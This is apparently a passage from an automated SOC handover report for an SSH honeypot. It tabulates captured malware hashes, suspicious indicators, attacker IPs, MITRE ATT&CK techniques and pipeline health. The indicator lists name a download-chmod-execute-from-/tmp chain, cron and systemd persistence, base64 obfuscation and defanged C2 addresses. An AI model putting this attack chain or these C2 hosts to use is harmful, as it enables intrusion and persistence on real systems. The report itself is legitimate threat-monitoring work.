| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `51.38.226[.]55` | FR | OVH SAS | **100** ⚠️ | 0 |
| `103.154.77[.]48` | ID | PT Tonggak Teknologi Netikom | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `177.65.188[.]143` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 2 |
| `168.144.63[.]226` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `27.156.154[.]3` | CN | Nind broadband network the | **100** ⚠️ | 50 |
| `157.230.242[.]116` | SG | DigitalOcean, LLC | **100** ⚠️ | 6 |
| `43.128.67[.]6` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 1 |
| `157.173.125[.]24` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `101.126.69[.]201` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 32 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 31 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 44 cases |
| Tool 34  | Credential Extractor        | ✅ 145 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (4.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 31 priority case(s) shown individually · 11 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-20T02:31:58Z_
